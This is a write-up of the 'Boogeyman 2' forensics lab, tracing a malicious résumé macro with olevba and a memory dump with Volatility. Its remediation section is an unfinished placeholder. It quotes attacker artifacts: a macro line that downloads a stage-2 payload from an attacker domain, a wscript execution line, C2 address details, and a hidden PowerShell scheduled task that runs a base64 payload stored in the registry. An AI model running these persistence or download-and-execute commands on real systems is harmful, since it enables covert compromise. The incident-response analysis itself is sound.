# Boogeyman 2 Writeup

**Difficulty:** Medium \
**Focus Area:** Incident Response, Memory Forensics, Phishing Analysis
 
## Objective 
In this challenge, Quick Logistics LLC has experienced a follow-up cyberattack by an attacker known as the Boogeyman. In this scenario Maxine, a HR specialist, received a spear-phishing email in the form of an application for one of the open positions in the company. This email contained a malicious attachment. The objective in this challenge is to analyze the provided artifact and workstation memory dump using tools like Volatility and Olevba to trace the malware's execution flow, identify the established Command and Control (C2) infrastructure, and uncover the attacker's persistence mechanisms. 
 
## Investigation Steps 
 
### 1. Identifying the sender 
 
**Task:** What email was used to send the phishing email? 
 
I identified the sender from the .eml file on the machine. Note that the "from" field can easily be spoofed, but in this task, I observed the actual sender email address as well, and they matched. 
 
**Answer:** westaylor23@outlook.com 
 
### 2. Identifying the recipient
 
**Task:** What is the email of the victim employee?
 
I found this in the same file as the previous task. 
 
**Answer:** maxine.beck@quicklogisticsorg.onmicrosoft.com
 
### 3. Analyzing the malicious attachment
 
**Task:** What is the name of the attached malicious document? 
 
I identified the name of the attachment from the .eml file. 
 
**Answer:** Resume_WesleyTaylor.doc
 
**Task:** What is the MD5 hash of the malicious attachment?
 
I checked this in the terminal using the `md5sum <filename>` command. This gave me the hash of the file, which could then be used in tools like VirusTotal to look for more detailed information about the file.
 
```bash
md5sum Resume_WesleyTaylor.doc
```
 
**Answer:** 52c4384a0b9e248b95804352ebec6c5b
 
### 4. Extracting Macro Payloads
 
**Task:** What URL is used to download the stage 2 payload based on the document's macro?
 
Based on a hint provided at the beginning of the room, I used `olevba` on the malicious attachment to extract its macros and understand its behavior. 
 
```bash
olevba Resume_WesleyTaylor.doc
```
 
From the output, I was able to see that there was a macro making a GET request to a specific external URL to download an image file called "update.png".
 
```bash
xHttp.Open "GET", "[https://files.boogeymanisback.lol/aa2a9c53cbb88416d3b47d85538d9971/update.png](https://files.boogeymanisback.lol/aa2a9c53cbb88416d3b47d85538d9971/update.png)", False
```
 
The file is downloaded from this URL and saved on the machine as update.js. 
 
**Answer:** https://files.boogeymanisback.lol/aa2a9c53cbb88416d3b47d85538d9971/update.png
 
### 5. Payload Execution and Process Identification
 
**Task:** What is the name of the process that executed the newly downloaded stage 2 payload?
 
From the macros extracted by olevba, I identified that the process executing the payload was the following:
 
```bash
shell_object.Exec("wscript.exe C:\ProgramData\update.js")
```
 
Shell is used to execute wscript.exe, which in turn executes update.js. 
 
**Answer:** wscript.exe
 
**Task:** What is the full file path of the malicious stage 2 payload?
 
**Answer:** C:\ProgramData\update.js
 
**Task:** What is the PID and PPID of the process that executed the stage 2 payload?
 
To find the PID of `wscript.exe`, I used Volatility's `windows.psscan` plugin on the provided memory dump (WKSTN-2961.raw). 
 
```bash
vol -f WKSTN-2961.raw windows.psscan > scan.txt
```
The above command saved the results of the scan to a text file so I didn't have to scan the image multiple times. I viewed the contents of the file with `cat` to understand the output structure. After that, I used `grep` to focus on the specific process. 
 
```bash
grep -i "wscript.exe" scan.txt
```
 
From the output, I identified the Process ID (PID) and the Parent Process ID (PPID) of the executable.
 
**Answer:** PID - 4260, PPID - 1124
 
### 6. Identifying the Next Stage Payload and C2 Communication
 
**Task:** What URL is used to download the malicious binary executed by the stage 2 payload?
 
In Windows architecture, parent processes often handle the staging and network connections before passing execution to child processes, which meant I needed to examine PID 1124 (the parent PID of wscript.exe). I used Volatility's `memmap` plugin to extract its memory space.
 
```bash
vol -f WKSTN-2961.raw windows.memmap --pid 1124 --dump
```
 
I read this .dmp file using `strings`. Because the standard output was too massive to make sense of, I piped it into `grep`. 
 
```bash
strings pid.1124.dmp | grep -i "https"
```
Filtering for the "https" keyword yielded a manageable output where I found the required URL. 
 
**Answer:** https://files.boogeymanisback.lol/aa2a9c53cbb88416d3b47d85538d9971/update.exe
 
Note: While the payload is hosted on the attacker's infrastructure as update.exe, subsequent investigation reveals it is saved and executed on the victim's local system as updater.exe.
 
**Task:** What is the PID of the malicious process used to establish the C2 connection?
 
To find active Command and Control (C2) connections, I used Volatility's `windows.netscan` plugin. I output the results to `netscan.txt` to avoid rerunning the lengthy scan. 
 
```bash
vol -f WKSTN-2961.raw windows.netscan > netscan.txt
```
 
The output provided a log of network traffic extracted from the image. By using `grep` with the keyword "update", I found the required PID. 
 
**Answer:** 6216
 
### 7. Locating Malicious Files and Network Infrastructure
 
**Task:** What is the full file path of the malicious process used to establish the C2 connection?
 
To find exactly where `updater.exe` was running from, I extracted a new memory dump for PID 6216. After generating the dump, I used the `strings` command combined with `grep` to locate the file path. 
 
```bash
strings pid.6216.dmp | grep -i "updater.exe"
```
 
**Answer:** C:\Windows\Tasks\updater.exe
 
**Task:** What is the IP address and port of the C2 connection initiated by the malicious binary?
 
Using the `netscan.txt` file I extracted earlier, I searched for connections associated with PID 6216. 
 
```bash
grep "6216" netscan.txt
```
 
The output revealed the IP address and port from the netscan file. 
 
```bash
0xe58f84d95010 TCPv4 10.10.49.181 63350 128.199.95.189 8080 CLOSED 6216
```
 
**Answer:** 128.199.95.189:8080
 
**Task:** What is the full file path of the malicious email attachment based on the memory dump?
 
To determine where the original phishing attachment was stored on disk, I used the `strings` command on the raw memory dump (WKSTN-2961.raw), grepping for the known filename `Resume_WesleyTaylor`. 
 
```bash
strings WKSTN-2961.raw | grep -i "Resume_WesleyTaylor"
```
 
**Answer:** C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
 
 
### 8. Attacker Persistence
 
**Task:** The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?
 
The attacker used a scheduled task to ensure that their malware would survive a system reboot. To find this task, I searched the memory dump for the keyword "schtask" to identify scheduled task creations.
 
```bash
strings WKSTN-2961.raw | grep -i "schtask"
```
 
**Answer:** schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'
 
This scheduled task runs daily at 09:00. It establishes a fileless persistence mechanism on the machine by creating a scheduled task called "Updater". It uses PowerShell in non-interactive mode, and the -W hidden flag hides the window so it doesn't appear on the screen. This doesn't execute a file on disk, but rather extracts, decodes, and executes a malicious payload stored within the Windows Registry. The task tries to evade detection by using common and trusted system tools, in this case, Task Scheduler and PowerShell. \

### 9. Lessons Learned and Remediation

<span style="color:Red;">Todo: make this section </span>
